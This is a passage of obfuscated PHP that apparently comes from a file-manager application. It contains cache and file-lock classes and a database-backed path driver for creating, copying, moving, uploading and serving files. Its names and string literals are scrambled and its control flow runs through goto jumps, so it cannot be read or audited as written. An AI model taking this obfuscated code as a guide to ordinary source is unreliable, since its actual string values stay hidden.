$CŠÈÒôæ . $C”§½å’˜[780] . self::$errorMsg; } write_log($e¦å†öÁ¾á, $C”§½å’˜[781]); show_json($CŠÈÒôæ, !1); } goto DÏóè¿µ¿; a†ë‰µ¬òÏ: $C”§½å’˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÒ¼±Š¨Á = self::init(); $F¯°…ËˆĞ = self::key($aä«¬Û¾¾…); goto A‚¾ğ´˜; D¿²´‹Á»¸: } public static function lockGet($AœÛï’ïÌ) { $EöÊŠ‡¸åŞ = self::key($AœÛï’ïÌ); if (self::$lockItem[$EöÊŠ‡¸åŞ]) { return self::$lockItem[$EöÊŠ‡¸åŞ]; } return self::init()->lockGet($EöÊŠ‡¸åŞ); } public static function unlock($EÓŞêµå‘Õ) { $cœø‚¥ = self::key($EÓŞêµå‘Õ); self::$lockItem[$cœø‚¥] = null; return self::init()->unlock($cœø‚¥); } public static function unlockRuntime() { $FÀ¸È¬ôÕ× =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e¼Ù›¨„ = self::init(); $A§ÓÑ ‹Ö = !1; foreach (self::$lockItem as $d¼ÄãØÒçÔ => $c£±¯œ°Ù¡) { if (!$c£±¯œ°Ù¡) { continue; } $e¼Ù›¨„->unlock($d¼ÄãØÒçÔ); if (!$A§ÓÑ ‹Ö) { $A§ÓÑ ‹Ö = !0; write_log($FÀ¸È¬ôÕ×[782] . $d¼ÄãØÒçÔ . $FÀ¸È¬ôÕ×[77] . get_caller_msg(), $FÀ¸È¬ôÕ×[781]); continue; } write_log($FÀ¸È¬ôÕ×[782] . $d¼ÄãØÒçÔ, $FÀ¸È¬ôÕ×[781]); } self::fileUnlockAll(); } public static function fileLock($bËÏ„ö›¤É) { goto fÔ¸Æ¦ÂÏ; fÔ¸Æ¦ÂÏ: $A¹†‰ËõÅ¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$GLOBALS[$A¹†‰ËõÅ¢[783]]) { $GLOBALS[$A¹†‰ËõÅ¢[783]] = array(); } $GLOBALS[$A¹†‰ËõÅ¢[783]][$bËÏ„ö›¤É] = !1; goto Eñö½ËªŠÀ; Eñö½ËªŠÀ: $D¤øšø”¡ = fopen(DATA_PATH . $bËÏ„ö›¤É . $A¹†‰ËõÅ¢[784], $A¹†‰ËõÅ¢[785]); if (!$D¤øšø”¡) { return !1; } $GLOBALS[$A¹†‰ËõÅ¢[783]][$bËÏ„ö›¤É] = $D¤øšø”¡; goto aÊàĞß†ã; B®¬ãòø¸: return !1; goto Bªñ£®ë¸; aÊàĞß†ã: if (flock($D¤øšø”¡, LOCK_EX)) { return !0; } self::unlock($bËÏ„ö›¤É); show_json($A¹†‰ËõÅ¢[786], !1); goto B®¬ãòø¸; Bªñ£®ë¸: } public static function fileUnlock($e‹ÒäÜˆàø) { $aÑÄŒæäÃ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eœ®‹ÒöŞ = $GLOBALS[$aÑÄŒæäÃ[783]][$e‹ÒäÜˆàø]; if (!$Eœ®‹ÒöŞ) { return; } $GLOBALS[$aÑÄŒæäÃ[783]][$e‹ÒäÜˆàø] = !1; flock($Eœ®‹ÒöŞ, LOCK_UN); fclose($Eœ®‹ÒöŞ); } public static function fileUnlockAll() { $Fó¬à”¢òİ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$GLOBALS[$Fó¬à”¢òİ[783]]) { return; } foreach ($GLOBALS[$Fó¬à”¢òİ[783]] as $bĞÖÏ¿öÆÔ => $E¸ÂƒéË) { if (!$E¸ÂƒéË) { continue; } $GLOBALS[$Fó¬à”¢òİ[783]][$bĞÖÏ¿öÆÔ] = !1; flock($E¸ÂƒéË, LOCK_UN); fclose($E¸ÂƒéË); } $GLOBALS[$Fó¬à”¢òİ[783]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $fåÔÛ¡ÌÀ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eùãÌ…ñ³× = $GLOBALS[$fåÔÛ¡ÌÀ[6]][$fåÔÛ¡ÌÀ[354]]; self::$cachePath = $eùãÌ…ñ³×[$fåÔÛ¡ÌÀ[201]][$fåÔÛ¡ÌÀ[85]]; @mkdir(self::$cachePath, 511, !0); } public function lock($D”÷‘ÒØ½º, $Côº¿Û¢¥ˆ = 0) { goto BŠ¦æ‚º¢; A‘…¬ç¼éÅ: $this->unlock($D”÷‘ÒØ½º); return !1; goto d³ÀóÔ¡²Ë; DğËŸçÚ: $BËİ£«ÚÃ¾ = rtrim(self::$cachePath, $dÙ•¶‹å[8]) . $dÙ•¶‹å[787] . md5($D”÷‘ÒØ½º) . $dÙ•¶‹å[784]; if (file_exists($BËİ£«ÚÃ¾) && filemtime($BËİ£«ÚÃ¾) && filemtime($BËİ£«ÚÃ¾) < time() - 10) { @unlink($BËİ£«ÚÃ¾); } do { if (file_exists($BËİ£«ÚÃ¾)) { cacheLockWait(); continue; } $EÔ«¼×ÉˆÆ = fopen($BËİ£«ÚÃ¾, $dÙ•¶‹å[788]); if (!$EÔ«¼×ÉˆÆ) { return !1; } $a»á¯Ğ©…Ÿ = flock($EÔ«¼×ÉˆÆ, LOCK_EX | LOCK_NB); self::$caches[$D”÷‘ÒØ½º] = array($dÙ•¶‹å[789] => $EÔ«¼×ÉˆÆ, $dÙ•¶‹å[201] => $BËİ£«ÚÃ¾); fwrite($EÔ«¼×ÉˆÆ, $EÄè‡à’); clearstatcache(); if ($EÔ«¼×ÉˆÆ && $a»á¯Ğ©…Ÿ) { return !0; } cacheLockWait(); } while (microtime(!0) < $EÄè‡à’); goto A‘…¬ç¼éÅ; BŠ¦æ‚º¢: $dÙ•¶‹å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Aâ¤öñÀËĞ = microtime(!0); $EÄè‡à’ = $Aâ¤öñÀËĞ + $Côº¿Û¢¥ˆ + 0.0001; goto DğËŸçÚ; d³ÀóÔ¡²Ë: } public function lockGet($B¨êÊ¤â‘) { $eÊ†à‰­‡¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a˜Ğ›ªõ®ù = rtrim(self::$cachePath, $eÊ†à‰­‡¼[8]) . $eÊ†à‰­‡¼[787] . md5($B¨êÊ¤â‘) . $eÊ†à‰­‡¼[784]; return file_exists($a˜Ğ›ªõ®ù); } public function unlock($Bñ›óÚ‘°î) { goto f×¼‰˜Õ’; dŒ§ Î†™: unset(self::$caches[$Bñ›óÚ‘°î]); goto Eê‹µ‹Äˆ; f×¼‰˜Õ’: $d³‹›ùÅ¢¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BšªÆ¬³¶‘ = self::$caches[$Bñ›óÚ‘°î]; if (!$BšªÆ¬³¶‘) { return; } goto a›‚¶¬äÓ; a›‚¶¬äÓ: @flock($BšªÆ¬³¶‘[$d³‹›ùÅ¢¶[789]], LOCK_UN); @fclose($BšªÆ¬³¶‘[$d³‹›ùÅ¢¶[789]]); @unlink($BšªÆ¬³¶‘[$d³‹›ùÅ¢¶[201]]); goto dŒ§ Î†™; Eê‹µ‹Äˆ: } } goto c®—ÖƒĞÖå; c®—ÖƒĞÖå: class CacheLockRedis { public function lock($f•ãö„ğÉ, $Eæ°Ö‘øñ’ = 10) { $E®“„›è = Cache::init(); $cì˜™¤Í© = microtime(!0) + $Eæ°Ö‘øñ’; while (microtime(!0) < $cì˜™¤Í©) { $cæé÷ˆ¤Ì¡ = $E®“„›è->get($f•ãö„ğÉ); if (!$cæé÷ˆ¤Ì¡) { $fç› ê…œ¨ = $E®“„›è->setLock($f•ãö„ğÉ, $cì˜™¤Í©, $Eæ°Ö‘øñ’); if ($fç› ê…œ¨) { return !0; } } else { if ($cæé÷ˆ¤Ì¡ < microtime(!0)) { $E®“„›è->set($f•ãö„ğÉ, $cì˜™¤Í©, $Eæ°Ö‘øñ’ * 2); if ($E®“„›è->get($f•ãö„ğÉ) === $cæé÷ˆ¤Ì¡) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($e¶›©¶Š¥Â) { return Cache::init()->get($e¶›©¶Š¥Â); } public function unlock($BŠÀÊÀáïÓ) { return Cache::init()->remove($BŠÀÊÀáïÓ); } } class CacheLockMemcached { public function lock($BàÑ•ğöËñ, $dâÍÁîó¹ = 0) { $c¿Ü†×²ä = Cache::init(); $F–íõ²¶Ş = microtime(!0) + $dâÍÁîó¹; while (microtime(!0) < $F–íõ²¶Ş) { $BµøøŠÉØ‚ = $c¿Ü†×²ä->get($BàÑ•ğöËñ); if (!$BµøøŠÉØ‚ || $BµøøŠÉØ‚ < microtime(!0)) { $bäóˆ¢ÊÜ– = $c¿Ü†×²ä->handle->add($BàÑ•ğöËñ, $F–íõ²¶Ş, $dâÍÁîó¹); if ($bäóˆ¢ÊÜ–) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d¼…¦˜Ìİ) { return Cache::init()->get($d¼…¦˜Ìİ); } public function unlock($AÔ¡õÄø) { return Cache::init()->remove($AÔ¡õÄø); } } class CacheLockDatabase { public function lock($aíœò©°Û¥, $eš¼Í×‰¹‘ = 0) { $cÕå‹µË‹ = Model($_SERVER[í¤âËÚ£¶íÊ¢][763]); $aî¤í™æ·“ = microtime(!0) + $eš¼Í×‰¹‘; while (microtime(!0) < $aî¤í™æ·“) { $F•»Öğ©ŞŞ = $cÕå‹µË‹->get($aíœò©°Û¥); if (!$F•»Öğ©ŞŞ || $F•»Öğ©ŞŞ < microtime(!0)) { $EõƒóîÂ¤ = $cÕå‹µË‹->set($aíœò©°Û¥, $aî¤í™æ·“); if ($EõƒóîÂ¤) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B÷áóùå»à) { return Model($_SERVER[í¤âËÚ£¶íÊ¢][763])->get($B÷áóùå»à); } public function unlock($Dƒ„¹‹……Û) { Model($_SERVER[í¤âËÚ£¶íÊ¢][763])->remove($Dƒ„¹‹……Û); } } goto B¬¢¶ğ¦Ê; Bóìã­Î: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dôòöÖ‘Ï™) { $this->pathParse = $dôòöÖ‘Ï™; $this->model = Model($_SERVER[í¤âËÚ£¶íÊ¢][1164]); } public function getPath($cÕ±âÃÉ) { return trim($cÕ±âÃÉ, $_SERVER[í¤âËÚ£¶íÊ¢][8]); } public function pathFather($Dİ”Å–Šªä) { $dš†¢÷ğ¾î = $this->parse($Dİ”Å–Šªä); $dš†¢÷ğ¾î = $this->infoSimple($Dİ”Å–Šªä); return $dš†¢÷ğ¾î ? $dš†¢÷ğ¾î[$_SERVER[í¤âËÚ£¶íÊ¢][481]] : !1; } public function pathThis($d›Ş¬àå°Á) { $fƒŸ¯ßÀŸ’ = $this->infoSimple($d›Ş¬àå°Á); return $fƒŸ¯ßÀŸ’ ? $fƒŸ¯ßÀŸ’[$_SERVER[í¤âËÚ£¶íÊ¢][28]] : !1; } public function getPathOuter($aß°šğ™Ğ) { if (!$aß°šğ™Ğ) { return $aß°šğ™Ğ; } $bŠ”š»½ë£ = $this->parse($aß°šğ™Ğ); return KodIO::make($bŠ”š»½ë£[$_SERVER[í¤âËÚ£¶íÊ¢][397]]); } public function copyFolderFromIO($câÂ—»ÉÅ, $aÙøÔ‡Ş¬†, $fÚ×†£Šïó, $EÎÑ»èÎ«µ, $Bˆ°¬¤îâ÷) { $AÅµøˆŠ¥¹ = $this->model->copyFolderFromIO($câÂ—»ÉÅ, $aÙøÔ‡Ş¬†, $fÚ×†£Šïó, $EÎÑ»èÎ«µ, $Bˆ°¬¤îâ÷); return KodIO::make($AÅµøˆŠ¥¹); } public function isParentOf($C¶ùèé¥£¸, $CÒò»à‘²Å) { return $this->model->isParentOf($C¶ùèé¥£¸, $CÒò»à‘²Å); } public function mkfile($B²Å¦´å§¿, $EÆìÚŸ¾£ = '', $E¬ù¶È¹êğ = REPEAT_RENAME) { $C·¢Ï¦Õœ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f›Ñœà‹Î = $this->parse($B²Å¦´å§¿); $B²Å¦´å§¿ = $f›Ñœà‹Î[$C·¢Ï¦Õœ[397]]; for ($aÓ¬©«¤±Æ = 0; $aÓ¬©«¤±Æ < count($f›Ñœà‹Î[$C·¢Ï¦Õœ[1165]]); $aÓ¬©«¤±Æ++) { $F–Ìæˆå™ = $f›Ñœà‹Î[$C·¢Ï¦Õœ[1165]][$aÓ¬©«¤±Æ]; if ($aÓ¬©«¤±Æ == count($f›Ñœà‹Î[$C·¢Ï¦Õœ[1165]]) - 1) { $B²Å¦´å§¿ = $this->model->mkfile($B²Å¦´å§¿, $F–Ìæˆå™, $EÆìÚŸ¾£, $E¬ù¶È¹êğ); break; } $B²Å¦´å§¿ = $this->model->mkdir($B²Å¦´å§¿, $F–Ìæˆå™, REPEAT_SKIP); } return $this->getPathOuter($B²Å¦´å§¿); } public function mkdir($a‘Ÿ‰ç„¾İ, $C‡ª‚Êµ¾´ = REPEAT_SKIP) { $F…µ‘Ğ¾–É =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a˜±ƒÓêÇ¡ = $this->parse($a‘Ÿ‰ç„¾İ); $a‘Ÿ‰ç„¾İ = $a˜±ƒÓêÇ¡[$F…µ‘Ğ¾–É[397]]; for ($bÔ¯ÛÛ´¨˜ = 0; $bÔ¯ÛÛ´¨˜ < count($a˜±ƒÓêÇ¡[$F…µ‘Ğ¾–É[1165]]); $bÔ¯ÛÛ´¨˜++) { $EÎÁ…è¿£° = $a˜±ƒÓêÇ¡[$F…µ‘Ğ¾–É[1165]][$bÔ¯ÛÛ´¨˜]; $a‘Ÿ‰ç„¾İ = $this->model->mkdir($a‘Ÿ‰ç„¾İ, $EÎÁ…è¿£°, $C‡ª‚Êµ¾´); } return $this->getPathOuter($a‘Ÿ‰ç„¾İ); } public function copyFile($F½•™ÈÓ…¯, $bÑñâ˜Ññ, $bñ‹œ×Õğ = REPEAT_REPLACE) { $Dòæ•ÙÁ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EŸÕÒ•Ó = $this->parse($bÑñâ˜Ññ); $dˆ‡•ÅĞÌÇ = $this->model->copy($F½•™ÈÓ…¯, $EŸÕÒ•Ó[$Dòæ•ÙÁ[397]], $bñ‹œ×Õğ, $EŸÕÒ•Ó[$Dòæ•ÙÁ[85]]); return $dˆ‡•ÅĞÌÇ ? $this->getPathOuter($dˆ‡•ÅĞÌÇ) : !1; } public function moveFile($CÌğ¢’¡âò, $EøáİÇë‰, $aÖ«Š›¤ºŒ = REPEAT_REPLACE) { $A×¹µÔñ½è =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b­°Èøï³Õ = $this->parse($EøáİÇë‰); $aºŠöÉØÁ = $this->model->move($CÌğ¢’¡âò, $b­°Èøï³Õ[$A×¹µÔñ½è[397]], $aÖ«Š›¤ºŒ, $b­°Èøï³Õ[$A×¹µÔñ½è[85]]); return $aºŠöÉØÁ ? $this->getPathOuter($aºŠöÉØÁ) : !1; } public function copy($Cï·Ç È³¾, $a®È‡èƒ˜Š, $DÈçÇß÷³ = REPEAT_REPLACE) { $eù¬¸ƒ¥ÙÊ = $this->parse($a®È‡èƒ˜Š); $BãÕ¢”é¹ = $this->model->copy($Cï·Ç È³¾, $eù¬¸ƒ¥ÙÊ[$_SERVER[í¤âËÚ£¶íÊ¢][397]], $DÈçÇß÷³); return $BãÕ¢”é¹ ? $this->getPathOuter($BãÕ¢”é¹) : !1; } public function moveSameAllow() { } public function move($E•‘ê…Í», $d‘¤ÃäæŒ¼, $aÍ°¥Ç†–³ = REPEAT_REPLACE) { $a„Ùä¦Æ…Ü = $this->parse($d‘¤ÃäæŒ¼); $FŒÖ×½Ú´¬ = $this->model->move($E•‘ê…Í», $a„Ùä¦Æ…Ü[$_SERVER[í¤âËÚ£¶íÊ¢][397]], $aÍ°¥Ç†–³); return $FŒÖ×½Ú´¬ ? $this->getPathOuter($FŒÖ×½Ú´¬) : !1; } public function remove($aË‡Óğáè, $fÊò¶æ¡†“ = true) { return $this->model->remove($aË‡Óğáè, $fÊò¶æ¡†“); } public function rename($EçÂö¿Ñ­Ã, $D•Âß°Æô¼) { $FÌ‘İ»§Ç = $this->model->rename($EçÂö¿Ñ­Ã, $D•Âß°Æô¼); return $FÌ‘İ»§Ç ? $this->getPathOuter($EçÂö¿Ñ­Ã) : $FÌ‘İ»§Ç; } public function size($B÷‹¢›Œ¥í) { $C©èÅÇ‡Š¿ = $this->infoSimple($B÷‹¢›Œ¥í); return $C©èÅÇ‡Š¿ ? $C©èÅÇ‡Š¿[$_SERVER[í¤âËÚ£¶íÊ¢][87]] : 0; } public function infoSimple($b„³’†¹î) { return $this->model->sourceInfo($b„³’†¹î); } public function info($bÊ‹–îÜë£) { return $this->infoParse($bÊ‹–îÜë£); } public function infoAuth($F¹ÂŸ›âØÂ) { return $this->infoParse($F¹ÂŸ›âØÂ, !1, !0); } public function infoWithChildren($bòğ­Ö‚òŠ) { return $this->infoParse($bòğ­Ö‚òŠ, !0); } protected function infoParse($e•÷„öŞÏì, $C„ÜšÚŒÊî = false, $CĞ¥ÑÛÔ’ = false) { if (!$C„ÜšÚŒÊî) { return $this->model->pathInfo($e•÷„öŞÏì, $CĞ¥ÑÛÔ’); } return $this->model->pathInfoMore($e•÷„öŞÏì); } public function infoFull($Béƒó–©œÄ) { $B—Åì—§Š½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BœéîŸˆ‡‰ = explode($B—Åì—§Š½[8], $Béƒó–©œÄ); $fÖĞõ—Ìê = implode($B—Åì—§Š½[8], array_splice($BœéîŸˆ‡‰, 1)); return $this->model->pathInfoByPath($BœéîŸˆ‡‰[0], $fÖĞõ—Ìê); } public function hashSimple($Cáº­Û…œ³) { $bŞÖ”¡ö¬â =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Dù½ˆ‡Ï˜œ = $this->infoWithChildren($Cáº­Û…œ³); return $Dù½ˆ‡Ï˜œ[$bŞÖ”¡ö¬â[173]][$bŞÖ”¡ö¬â[180]]; } public function hashMd5($DÁÄŞõÉã) { $C¾ˆˆÍóÄà =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F¿£Èé¡ Û = $this->infoWithChildren($DÁÄŞõÉã); return $F¿£Èé¡ Û[$C¾ˆˆÍóÄà[173]][$C¾ˆˆÍóÄà[179]]; } public function exist($cŸÀ‘ƒ‹) { $b„ï²Ô‰‡ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e®„©áí‰ = $this->parse($cŸÀ‘ƒ‹); if (!$e®„©áí‰[$b„ï²Ô‰‡[85]]) { return $this->isFile($cŸÀ‘ƒ‹) || $this->isFolder($cŸÀ‘ƒ‹); } $f¶“ôÁï÷˜ = array($b„ï²Ô‰‡[398] => $e®„©áí‰[$b„ï²Ô‰‡[397]], $b„ï²Ô‰‡[28] => $e®„©áí‰[$b„ï²Ô‰‡[85]]); $Bé˜Ñ—áÒ¸ = $this->model->where($f¶“ôÁï÷˜)->find(); return $Bé˜Ñ—áÒ¸ ? !0 : !1; } public function isFile($b†á´ÜÅ†ß) { $BîšØó¨å =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eâŠ”‘‰³Ä = $this->infoSimple($b†á´ÜÅ†ß); return $eâŠ”‘‰³Ä && $eâŠ”‘‰³Ä[$BîšØó¨å[406]] == $BîšØó¨å[96] ? !1 : !0; } public function isFolder($c¯±Ğ®êÒ) { $c…†‡„–« =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÕè†Ğº = $this->infoSimple($c¯±Ğ®êÒ); return $FÕè†Ğº && $FÕè†Ğº[$c…†‡„–«[406]] == $c…†‡„–«[96] ? !0 : !1; } public function listPath($f‘´ªŞÅ…Ğ, $aÌ†ƒÒº¢” = false) { $fª¹˜ˆ‚ç· =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($f‘´ªŞÅ…Ğ == $fª¹˜ˆ‚ç·[33]) { return !1; } $D½ÓˆïëÚÒ = array($fª¹˜ˆ‚ç·[398] => $f‘´ªŞÅ…Ğ); if ($aÌ†ƒÒº¢”) { return $this->model->listSource($D½ÓˆïëÚÒ, -1); } return $this->model->listSource($D½ÓˆïëÚÒ); } public function has($bÏ¨—ÎÄİ¤, $bÛç‹ÀË¿¡ = false, $F…´ØÌÄğ­ = null) { $E«¡‡öè =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fĞØ‰õÕÖ = $this->infoWithChildren($bÏ¨—ÎÄİ¤); if ($bÛç‹ÀË¿¡) { return array($E«¡‡öè[212] => $fĞØ‰õÕÖ[$E«¡‡öè[212]], $E«¡‡öè[211] => $fĞØ‰õÕÖ[$E«¡‡öè[211]]); } return $F…´ØÌÄğ­ ? $fĞØ‰õÕÖ[$E«¡‡öè[212]] : $fĞØ‰õÕÖ[$E«¡‡öè[211]]; } public function listAll($FßŠ£Æòé¸) { $EÆÎĞ…›œÍ = IO::info($this->pathParse[$_SERVER[í¤âËÚ£¶íÊ¢][85]]); if (!$EÆÎĞ…›œÍ) { return array(); } return $this->model->listAll($FßŠ£Æòé¸); } public function getContent($AËÑ¥á£İ™) { return $this->model->getContent($AËÑ¥á£İ™); } public function setContent($b«½›‚Ÿß«, $B’ºôÊ‡¦ = '') { return $this->model->setContent($b«½›‚Ÿß«, $B’ºôÊ‡¦); } public function fileSubstr($DîáÚ£Ü », $dØ¦º‹¼, $EÂ®‚òöõ) { return $this->model->fileSubstr($DîáÚ£Ü », $dØ¦º‹¼, $EÂ®‚òöõ); } public function download($FîùªËŸ¤, $F¸—Ï‰²“– = '') { $dçù‰¸— = get_path_father($F¸—Ï‰²“–); $Fä›¢öÂò = get_path_this($F¸—Ï‰²“–); $E½¸©Ğóê = $this->model->fileInfoGet($FîùªËŸ¤); $CÙ±ŞÒ˜†º = IO::copy($E½¸©Ğóê[$_SERVER[í¤âËÚ£¶íÊ¢][85]], $dçù‰¸—, !1, $Fä›¢öÂò); return $CÙ±ŞÒ˜†º; } public function setModifyTime($F±ÅøØŠœ, $aç­¯°øß = '') { $this->model->metaSet($F±ÅøØŠœ, $_SERVER[í¤âËÚ£¶íÊ¢][1166], $aç­¯°øß); } public function upload($f‚–‘²ÅÎ÷, $Aµ½Ü¨Ì²£, $Fˆñ³Ñ¿×ø = false, $AØ¹ŒÄãª½ = REPEAT_REPLACE) { $E„ù‡œ´áË =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DğÑ˜è­ = $this->parse($f‚–‘²ÅÎ÷); $aí§é¢Ò  = $this->model->addFile($DğÑ˜è­[$E„ù‡œ´áË[397]], $Aµ½Ü¨Ì²£, $DğÑ˜è­[$E„ù‡œ´áË[85]], $Fˆñ³Ñ¿×ø, $AØ¹ŒÄãª½); return $this->getPathOuter($aí§é¢Ò ); } public function uploadFileByID($F»††©¨¯, $b„Í’àƒÓ, $eéù…•¾ºí) { $b®¥ñ‘‹ÓÇ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÊë³Ş¿ËÁ = $this->parse($F»††©¨¯); $aõãØµùÒğ = $this->model->addFileByFileID($EÊë³Ş¿ËÁ[$b®¥ñ‘‹ÓÇ[397]], $b„Í’àƒÓ, $EÊë³Ş¿ËÁ[$b®¥ñ‘‹ÓÇ[85]], $eéù…•¾ºí); return $this->getPathOuter($aõãØµùÒğ); } public function addFileByRemote($BÉòÅˆ¾¢“, $F·–À•‹Ê‹, $fçõ’„æ•¼ = array(), $D™«ç‡ç‘ï = '', $A¾…®®›) { $d¾æçÄ¶Ê¯ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÑè‡Âï—ª = $this->parse($BÉòÅˆ¾¢“); $D™«ç‡ç‘ï = empty($D™«ç‡ç‘ï) ? $dÑè‡Âï—ª[$d¾æçÄ¶Ê¯[85]] : $D™«ç‡ç‘ï; $f•êÒå‘Á÷ = $this->model->addFileByRemote($dÑè‡Âï—ª[$d¾æçÄ¶Ê¯[397]], $F·–À•‹Ê‹, $D™«ç‡ç‘ï, $fçõ’„æ•¼, $A¾…®®›); return $this->getPathOuter($f•êÒå‘Á÷); } public function uploadLink($B‘Àø¹‹ĞÍ, $B±ÔÌó’ºâ = 0) { $FÏğÀæÛ’¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EïÊ¡éõÆë = $this->parse($B‘Àø¹‹ĞÍ); $AİŠÀÚÅå = _get($GLOBALS[$FÏğÀæÛ’¦[7]], $FÏğÀæÛ’¦[1167]); $FÉÃØ»Å… = _get($GLOBALS[$FÏğÀæÛ’¦[7]], $FÏğÀæÛ’¦[1168]); $B‘Àø¹‹ĞÍ = Model($FÏğÀæÛ’¦[575])->createFileName($EïÊ¡éõÆë[$FÏğÀæÛ’¦[85]], $AİŠÀÚÅå, $FÉÃØ»Å…); return IO::uploadLink($B‘Àø¹‹ĞÍ, $B±ÔÌó’ºâ); } public function fileNameAuto($BÁÕÕè×ø®, $B¾ÕöÑ£‹, $EÒ¯Á„’¯È = REPEAT_REPLACE, $Eî•ˆ™éÚ¡ = false) { return $this->model->fileNameAuto($BÁÕÕè×ø®, $B¾ÕöÑ£‹, $EÒ¯Á„’¯È, $Eî•ˆ™éÚ¡); } public function fileNameExist($b”èé¦©åé, $fòËµÈ‡Ó¦) { return $this->model->fileNameExist($b”èé¦©åé, $fòËµÈ‡Ó¦); } protected function _fileOut($aÊ¾«¾×Ä’, $Cñ˜ÚÙÔ°† = false, $D±ñŒÖÌÒÛ = false, $C³¬º¤ƒÍ = '', $dĞ¡ùÈ“ğ = false) { goto D¬Š…í†Ç†; D¬Š…í†Ç†: $a­äíá‰ä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $C¤¼ï×Ö»ù = $this->model->sourceInfo($aÊ¾«¾×Ä’); if ($C¤¼ï×Ö»ù[$a­äíá‰ä[406]] == $a­äíá‰ä[96]) { header($a­äíá‰ä[1169]); die; } goto D‹Â¾á¢äÖ; D‹Â¾á¢äÖ: $FŸå…Ú‚¨â = $this->model->fileInfoGet($aÊ¾«¾×Ä’); $C³¬º¤ƒÍ = $FŸå…Ú‚¨â[$a­äíá‰ä[179]] ? $FŸå…Ú‚¨â[$a­äíá‰ä[179]] : $C³¬º¤ƒÍ; $FôÛÃ§Å±¯ = isset($GLOBALS[$a­äíá‰ä[1170]]) ? $GLOBALS[$a­äíá‰ä[1170]] : $C¤¼ï×Ö»ù[$a­äíá‰ä[28]]; goto e†ÍªÀœ½ã; e†ÍªÀœ½ã: if ($dĞ¡ùÈ“ğ) { return IO::fileOutServer($FŸå…Ú‚¨â[$a­äíá‰ä[85]], $Cñ˜ÚÙÔ°†, $FôÛÃ§Å±¯, $C³¬º¤ƒÍ); } IO::fileOut($FŸå…Ú‚¨â[$a­äíá‰ä[85]], $Cñ˜ÚÙÔ°†, $FôÛÃ§Å±¯, $C³¬º¤ƒÍ); goto FÑô™Ìèƒ‰; FÑô™Ìèƒ‰: } public function fileOut($dÎÅÇ’È„, $fİÓ×”²ÕÏ = false, $a†”¤ÉŒñÒ = false, $AÖÇôÔŞ¤‚ = '') { $this->_fileOut($dÎÅÇ’È„, $fİÓ×”²ÕÏ, $a†”¤ÉŒñÒ, $AÖÇôÔŞ¤‚); } public function fileOutServer($c‘Ö®ùìÕ±, $BÙ’‡ğã„ = false, $báÃİŒá‚ = false, $dˆ¿¹Àºç— = '') { $this->_fileOut($c‘Ö®ùìÕ±, $BÙ’‡ğã„, $báÃİŒá‚, $dˆ¿¹Àºç—, !0); } protected function _fileOutImage($AÕç¡Àƒ¬´, $aîçÌ¤äßÅ = 250) { goto E‡Ÿ±‰âÊ‰; E‡Ÿ±‰âÊ‰: $b±…‡™¢¼ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÍ‚ª¸Å¬ = $this->model->pathInfo($AÕç¡Àƒ¬´); if ($dÍ‚ª¸Å¬[$b±…‡™¢¼[406]] == $b±…‡™¢¼[96]) { show_json($b±…‡™¢¼[1171] . $AÕç¡Àƒ¬´, !1); } goto C¤ôÜİŠö’; a¯ª„ë¥¢å: $GLOBALS[$b±…‡™¢¼[1170]] = $C÷×ßÜàœä[$b±…‡™¢¼[28]]; $GLOBALS[$b±…‡™¢¼[171]] = $C÷×ßÜàœä; IO::fileOutImage($C÷×ßÜàœä[$b±…‡™¢¼[85]], $aîçÌ¤äßÅ); goto cîáïÕÙ¦ó; C¤ôÜİŠö’: $C÷×ßÜàœä = $this->model->fileInfoGet($AÕç¡Àƒ¬´); $C÷×ßÜàœä[$b±…‡™¢¼[28]] = $dÍ‚ª¸Å¬[$b±…‡™¢¼[28]]; $C÷×ßÜàœä[$b±…‡™¢¼[172]] = $dÍ‚ª¸Å¬[$b±…‡™¢¼[172]]; goto a¯ª„ë¥¢å; cîáïÕÙ¦ó: } public function fileOutImage($B×öÔ…°‡ò, $A¼‘È‰›¢ = 250) { $this->_fileOutImage($B×öÔ…°‡ò, $A¼‘È‰›¢); } public function fileOutImageServer($D•×ÚÔÊÍ, $då‹¤î»³ç = 250) { $this->_fileOutImage($D•×ÚÔÊÍ, $då‹¤î»³ç); } public function link($C‡‹’£­àğ, $Eó‚ê›‹ËÖ = '') { $C‰è½İˆÕ™ = $this->model->fileInfoGet($C‡‹’£­àğ); return IO::link($C‰è½İˆÕ™[$_SERVER[í¤âËÚ£¶íÊ¢][85]], $Eó‚ê›‹ËÖ); } protected function parse($eÌŠ„ˆ½èä) { $CÂ¨ŞÁœË­ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (strstr($eÌŠ„ˆ½èä, $CÂ¨ŞÁœË­[8]) === !1) { return array($CÂ¨ŞÁœË­[415] => intval($eÌŠ„ˆ½èä), $CÂ¨ŞÁœË­[85] => $CÂ¨ŞÁœË­[33], 